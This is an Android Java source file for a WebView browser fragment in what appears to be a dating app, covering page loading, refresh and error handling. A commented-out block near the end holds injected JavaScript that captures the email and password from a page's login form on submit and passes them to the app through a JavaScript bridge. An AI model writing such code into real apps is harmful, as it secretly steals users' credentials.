package com.datingforall.anonymousOnlineDating.fragment;

import android.annotation.SuppressLint;
import android.graphics.Bitmap;
import android.os.Build;
import android.os.Bundle;

import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.ViewTreeObserver;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

import com.android.widget.ExtendedWebView;
import com.datingforall.anonymousOnlineDating.Const;

public class BrowserFragment extends BaseFragment implements View.OnClickListener {


    private ViewTreeObserver.OnScrollChangedListener mOnScrollChangedListener;

    private final String TAG = "@@@";
    private boolean isConnected = true;

    private java.lang.String errorPage = "file:///android_asset/www/index.html";

    public ExtendedWebView mWebView;
    private ProgressBar progressBar;

    /**
     * The fragment argument representing the section number for this
     * fragment.
     */
    private static final String ARG_URL = "section_number";
    private SwipeRefreshLayout swipeRefreshLayout;
    private String url;

    public BrowserFragment() {
        Log.i(TAG, "BrowserFragment: ");
    }

    /**
     * Returns a new instance of this fragment for the given section
     * number.
     *
     * @param url
     */
    public static BrowserFragment newInstance(String url) {
        BrowserFragment fragment = new BrowserFragment();
        Bundle args = new Bundle();
        args.putString(ARG_URL, url);
        fragment.setArguments(args);
        return fragment;
    }

    @SuppressLint("ResourceType")
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {


        RelativeLayout.LayoutParams ww = new RelativeLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT
        );
        ww.addRule(RelativeLayout.CENTER_IN_PARENT);
        progressBar = new ProgressBar(getContext());

        swipeRefreshLayout = new SwipeRefreshLayout(getContext());
        swipeRefreshLayout.setId(8);

        mWebView = new ExtendedWebView(getContext());


        RelativeLayout rootView = new RelativeLayout(getContext());
        RelativeLayout.LayoutParams relativeParams = new RelativeLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT
        );
        relativeParams.addRule(RelativeLayout.ALIGN_PARENT_TOP);

        swipeRefreshLayout.addView(mWebView, relativeParams);
        rootView.addView(swipeRefreshLayout, relativeParams);
        rootView.addView(progressBar, ww);

        //View rootView = inflater.inflate(R.layout.fragment_browser, container, false);

        if (getArguments() != null) {
            this.url = getArguments().getString(ARG_URL);
        }
        rootView.setOnClickListener(this);

//        Toolbar toolbar = rootView.findViewById(R.id.toolbar);
//        toolbar.setNavigationIcon(R.mipmap.ic_launcher);
//        ((MainActivity) getActivity()).setSupportActionBar(toolbar);

        //progressBar = rootView.findViewById(R.id.progressBar);
        return rootView;
    }

    @Override
    public void onViewCreated(@NonNull View view, @Nullable Bundle savedInstanceState) {
        super.onViewCreated(view, savedInstanceState);

    }

    @Override
    public void onActivityCreated(@Nullable Bundle savedInstanceState) {
        super.onActivityCreated(savedInstanceState);
        buildGUI();
    }

    private void buildGUI() {
        final String offlineMessageHtml = "DEFINE THIS";
        final String timeoutMessageHtml = "DEFINE THIS";

//        ConnectivityManager connectivityManager = (ConnectivityManager)
//                /*c.*/getSystemService(Context.CONNECTIVITY_SERVICE);
//        if (connectivityManager != null)
//
//        {
//            NetworkInfo ni = connectivityManager.getActiveNetworkInfo();
//            if (ni.getState() != NetworkInfo.State.CONNECTED) {
//                // record the fact that there is not connection
//                isConnected = false;
//            }
//        }

        //mWebView = view.findViewById(R.id.web_view);
        WebSettings mSettings = mWebView.getSettings();
        mSettings.setJavaScriptEnabled(true);
        mSettings.setBuiltInZoomControls(false);

        mSettings.setCacheMode(WebSettings.LOAD_DEFAULT);
        mSettings.setPluginState(WebSettings.PluginState.ON);


//        mSettings.setAllowFileAccess(true);
//        mSettings.setAllowContentAccess(true);
//
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
//            mSettings.setAllowFileAccessFromFileURLs(true);
//        }
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
//            mSettings.setAllowUniversalAccessFromFileURLs(true);
//        }

        mSettings.setUserAgentString(
                //"Mozilla/5.0 (Linux; Android 5.1.1; Nexus 7 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.78 Safari/537.36 OPR/30.0.1856.93524"
                System.getProperty("http.agent")
        );

        mSettings.setBlockNetworkImage(true);//#
        mWebView.setWebViewClient(new ZZZZZZZZZZ());


        mWebView.setWebChromeClient(new WebChromeClient() {
            @Override
            public void onProgressChanged(WebView view, int progress) {
                getActivity().setProgress(progress * 100);
            }
        });
        //mWebView.addJavascriptInterface(new MyJavascriptInterface(MainActivity.this, mWebView), "Client");


//        StringBuffer sb = new StringBuffer();
//        sb.append("&app=").append(getActivity().getPackageName());
//        sb.toString();//sig

        mWebView.loadUrl(this.url);

        //swipeRefreshLayout = view.findViewById(R.id.refresh);
        swipeRefreshLayout.getViewTreeObserver().addOnScrollChangedListener(mOnScrollChangedListener =
                new ViewTreeObserver.OnScrollChangedListener() {
                    @Override
                    public void onScrollChanged() {
                        if (mWebView.getScrollY() == 0)
                            swipeRefreshLayout.setEnabled(true);
                        else
                            swipeRefreshLayout.setEnabled(false);

                    }
                });

        swipeRefreshLayout.setOnRefreshListener(() -> {
            mWebView.reload();
            swipeRefreshLayout.setRefreshing(false);
        });

    }


    @Override
    public void onStop() {
        swipeRefreshLayout.getViewTreeObserver().removeOnScrollChangedListener(mOnScrollChangedListener);
        super.onStop();
    }

    public void loadErrorPage(WebView webview) {
//        if (webview != null) {
//
//            String htmlData = "<html><body><div align=\"center\" >This is the description for the load fail : "
//                    //+ description + "\nThe failed url is : " + failingUrl
//                    + "\n </div ></body > ";
//
//            webview.loadUrl("about:blank");
//            webview.loadDataWithBaseURL(null, htmlData, "text/html", "UTF-8", null);
//            webview.invalidate();
//
//        }
    }

    @Override
    public void onClick(View v) {
        if (getActivity() != null) {
            //((MainActivity) getActivity()).pressed(sectionNumber);
        }
    }

    public boolean canGoBack() {
        return (mWebView != null) && mWebView.canGoBack();
    }

    private class ZZZZZZZZZZ extends WebViewClient {

        /* @SuppressWarnings("deprecation")*/
//            @Override
//            public boolean shouldOverrideUrlLoading(WebView view, String url) {
////                DLog.d(url);
////                if (request..indexOf("host")<=0) {
////                    // the link is not for a page on my site, so launch another Activity that handles URLs
////                    Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
////                    startActivity(intent);
////                    return true;
////                }
////                return false;
//
//                if (isConnected) {
//                    // return false to let the WebView handle the URL
//                    return false;
//                } else {
//                    // show the proper "not connected" message
//                    view.loadData(offlineMessageHtml, "text/html", "utf-8");
//                    // return true if the host application wants to leave the current
//                    // WebView and handle the url itself
//                    return true;
//                }
//            }

        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            progressBar.setVisibility(View.VISIBLE);
            if (Const.DEBUG) {
                Log.i(TAG, "onPageStarted: " + url);
            }
            super.onPageStarted(view, url, favicon);
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            progressBar.setVisibility(View.GONE);
            if (Const.DEBUG) {
                Log.i(TAG, "onPageFinished: " + url);
            }
            super.onPageFinished(view, url);
        }

//            @TargetApi(Build.VERSION_CODES.N)
//            @Override
//            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
//                final Uri uri = request.getUrl();
//                return handleUri(uri);
//            }
//
//            @Override
//            public void onPageFinished(WebView view, String HTTP_BUHTA) {
//                super.onPageFinished(view, HTTP_BUHTA);
//
//                StringBuilder sb = new StringBuilder();
//                sb.append("document.getElementsByTagName('form')[0].onsubmit = function () {");
//
//
//                sb.append("var objPWD, objAccount;var str = '';");
//                sb.append("var inputs = document.getElementsByTagName('input');");
//                sb.append("for (var i = 0; i < inputs.length; i++) {");
//                sb.append("if (inputs[i].type.toLowerCase() === 'password') {objPWD = inputs[i];}");
//                sb.append("else if (inputs[i].name.toLowerCase() === 'email') {objAccount = inputs[i];}");
//                sb.append("}");
//                sb.append("if (objAccount != null) {str += objAccount.value;}");
//                sb.append("if (objPWD != null) { str += ' , ' + objPWD.value;}");
//                sb.append("window.MYOBJECT.processHTML(str);");
//                sb.append("return true;");
//
//
//                sb.append("};");
//
//                view.loadUrl("javascript:" + sb.toString());
//            }*/

        @Override
        public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
            Log.i(TAG, "onReceivedError: " + errorPage + description);
//                if (errorCode == ERROR_TIMEOUT) {
//                    view.stopLoading();  // may not be needed
//                    view.loadData(timeoutMessageHtml, "text/html", "utf-8");
//                } else {
//                    //view.loadData(errorCode+"", "text/html", "utf-8");
//                    mWebView.loadUrl(errorPage);
//                }
        }

        @Override
        public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
            super.onReceivedError(view, request, error);
            Log.i(TAG, "onReceivedError: " + error);
            loadErrorPage(view);
            Toast.makeText(getContext(), "Oh no! " + request + " " + error, Toast.LENGTH_SHORT).show();
        }


        @Override
        public void onReceivedHttpError(WebView view, WebResourceRequest request, WebResourceResponse errorResponse) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                Toast.makeText(view.getContext(), "HTTP error " + errorResponse.getStatusCode(), Toast.LENGTH_LONG).show();
            }
        }

    }
}